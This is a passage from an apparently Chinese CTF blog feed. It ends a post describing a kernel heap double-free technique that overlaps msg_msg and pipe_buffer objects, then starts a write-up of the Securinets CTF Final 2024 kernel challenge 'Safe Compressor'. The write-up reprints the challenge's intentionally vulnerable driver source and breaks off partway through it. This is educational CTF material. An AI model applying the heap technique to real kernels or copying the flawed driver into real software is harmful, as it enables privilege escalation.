</p><p>在这个环境中 kmalloc-512 free_list 的 next 指针在偏移为 0x100 的位置，我们可以先用 msg 来占位该 double free 的堆块（后面称为 victim obj）并修改 next 指针的低位指向 victim obj + 0x30 的位置（防止修改 msg 头）。然后再申请 pipe_buffer 来再次占位 victim obj（该 pipe_buffer 的起始位置位于 victim obj + 0x30），此时即可通过该 msg 来修改 pipe_buffer。接下来的攻击手段也有很多种，比如修改 pipe_buffer 的 flags 来打 dirty pipe、修改 pipe_buffer 的 page 指针来构造 page uaf 等，这里也不再做赘述。  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Securinets CTF Final 2024: Safe Compressor</title>
      <link href="/2025/01/09/Compressor/"/>
      <url>/2025/01/09/Compressor/</url>
      
        <content type="html"><![CDATA[<h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>复习了一天高数，晚上头昏欲裂，大脑酸的一批🤡🤡🤡，然后想找道 CTF 题目放松一下。然后想到去年 11 月的时候空白给我发了一道题目叫我看看，可以当时和同学在外面看《毒液：last dance》，所以就没有去做这道题目。于是我找空白问了一下，了解到这道题目当时 0 解，来劲了！！！不过虽然说是 0 解题，我是觉得挺简单的，两个小时就做出来了🤔，感觉是因为 final 选手们比较紧张就直接把内核题给跳过了🤔    </p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这是一道 linux kernel pwn，好像也没什么要注意的，就是版本特别的高：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@slub-vm:/home/user$ <span class="built_in">uname</span> -r</span><br><span class="line">6.12.0-rc7+</span><br></pre></td></tr></table></figure><p>出题人也特别的友好，直接给出了内核驱动的源码，省去了我们许多逆向的麻烦 :)  </p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;M0ngi&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Super safe compressor&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;safe_compressor&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_COMPRESS 0xdead0001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_DECOMPRESS 0xdead0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_DELETE 0xdead0003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_EMPTY 0xdead0004</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITEMS 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARRAY_SIZE 20</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compressed_arr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">compressed_arr</span> *<span class="title">compressed_data</span>[<span class="title">MAX_ITEMS</span>] =</span> &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">g_mutex</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">int</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">unsigned</span> <span class="type">char</span> **compressed, <span class="type">long</span> <span class="type">unsigned</span> *out_size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">decompress</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">int</span> **output, <span class="type">long</span> <span class="type">unsigned</span> *out_size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_empty_idx</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_bit_to_result</span><span class="params">(<span class="type">int</span> current_bit, <span class="type">unsigned</span> <span class="type">char</span> **ptr, <span class="type">unsigned</span> <span class="type">long</span> *idx, <span class="type">unsigned</span> <span class="type">long</span> *bits)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_obj_by_id</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> id)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">g_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open = vuln_open,</span><br><span class="line">    .release = vuln_release,</span><br><span class="line">    .unlocked_ioctl = vuln_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">g_device</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name = DEVICE_NAME,</span><br><span class="line">    .fops = &amp;g_fops,</span><br><span class="line">    .mode = <span class="number">0666</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;</span><br><span class="line">    <span class="type">int</span> *<span class="built_in">array</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">empty_array_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_empty_idx</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ITEMS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (compressed_data[i] == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">find_obj_by_id</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ITEMS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (compressed_data[i] != <span class="literal">NULL</span> &amp;&amp; compressed_data[i]-&gt;idx == id)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Open the device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Close the device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">vuln_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_compress</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="type">int</span> user_array[MAX_ARRAY_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_empty_idx();</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arg_struct.size &lt;= <span class="number">0</span> || arg_struct.size &gt; MAX_ARRAY_SIZE)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(user_array, <span class="number">0</span>, arg_struct.size * <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(user_array, arg_struct.<span class="built_in">array</span>, arg_struct.size * <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    compressed_data[idx] = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> compressed_arr), GFP_KERNEL);</span><br><span class="line">    compressed_data[idx]-&gt;idx = arg_struct.idx;</span><br><span class="line">    compress(user_array, arg_struct.size, &amp;compressed_data[idx]-&gt;data, &amp;compressed_data[idx]-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_delete</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    kfree(compressed_data[idx]-&gt;data);</span><br><span class="line">    compressed_data[idx]-&gt;data = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(compressed_data[idx]);</span><br><span class="line">    compressed_data[idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_empty</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(compressed_data[idx]-&gt;data, <span class="number">0</span>, compressed_data[idx]-&gt;size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ioctl_decompress</span><span class="params">(<span class="type">void</span> __user *argp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">decompress_array_arg</span> <span class="title">arg_struct</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;arg_struct, argp, <span class="keyword">sizeof</span> arg_struct))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = find_obj_by_id(arg_struct.idx);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *decompressed;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> decompressed_size;</span><br><span class="line"></span><br><span class="line">    decompress(compressed_data[idx]-&gt;data, compressed_data[idx]-&gt;size, &amp;decompressed, &amp;decompressed_size);</span><br><span class="line">    <span class="type">int</span> size = min(arg_struct.size * <span class="number">4</span>, decompressed_size * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(arg_struct.<span class="built_in">array</span>, decompressed, size))</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(decompressed);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(decompressed);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle ioctl calls.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> __user *argp = (<span class="type">void</span> __user *)arg;</span><br><span class="line">    <span class="type">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mutex_trylock(&amp;g_mutex))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_COMPRESS:</span><br><span class="line">        err = ioctl_compress(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_DECOMPRESS:</span><br><span class="line">        err = ioctl_decompress(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_DELETE:</span><br><span class="line">        err = ioctl_delete(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_EMPTY:</span><br><span class="line">        err = ioctl_empty(argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutex_unlock(&amp;g_mutex);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">write_bit_to_result</span><span class="params">(<span class="type">int</span> current_bit, <span class="type">unsigned</span> <span class="type">char</span> **ptr, <span class="type">unsigned</span> <span class="type">long</span> *idx, <span class="type">unsigned</span> <span class="type">long</span> *bits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mask = ~(<span class="number">1</span> &lt;&lt; *idx);</span><br><span class="line">    (**ptr) &amp;= mask;</span><br><span class="line">    (**ptr) |= (current_bit &lt;&lt; *idx);</span><br><span class="line"></span><br><span class="line">    (*idx)++;</span><br><span class="line">    (*bits)++;</span><br><span class="line">    <span class="keyword">if</span> (*idx == <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *idx = <span class="number">0</span>;</span><br><span class="line">        (*ptr)++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">compress</span><span class="params">(<span class="type">int</span> *input, <span class="type">unsigned</span> <span class="type">long</span> size, <span class="type">unsigned</span> <span class="type">char</span> **compressed, <span class="type">unsigned</span> <span class="type">long</span> *out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    *compressed = kzalloc(<span class="keyword">sizeof</span>(<span class="type">int</span>) * size, GFP_KERNEL);</span><br><span class="line">    *out_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *ptr = *compressed;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx = <span class="number">0</span>; <span class="comment">// From 0 to 7, indexing *ptr</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> bits = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Here we have 32bits</span></span><br><span class="line">        <span class="type">int</span> curr_byte = input[i];</span><br><span class="line">        <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((curr_byte != <span class="number">0</span> &amp;&amp; offset &lt;= <span class="number">31</span>) || (curr_byte == <span class="number">0</span> &amp;&amp; offset &lt;= <span class="number">6</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Copy first 7 bits</span></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> current_bit = curr_byte &amp; <span class="number">1</span>;</span><br><span class="line">                curr_byte = curr_byte &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                offset++;</span><br><span class="line"></span><br><span class="line">                write_bit_to_result(current_bit, &amp;ptr, &amp;idx, &amp;bits);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (offset == <span class="number">7</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                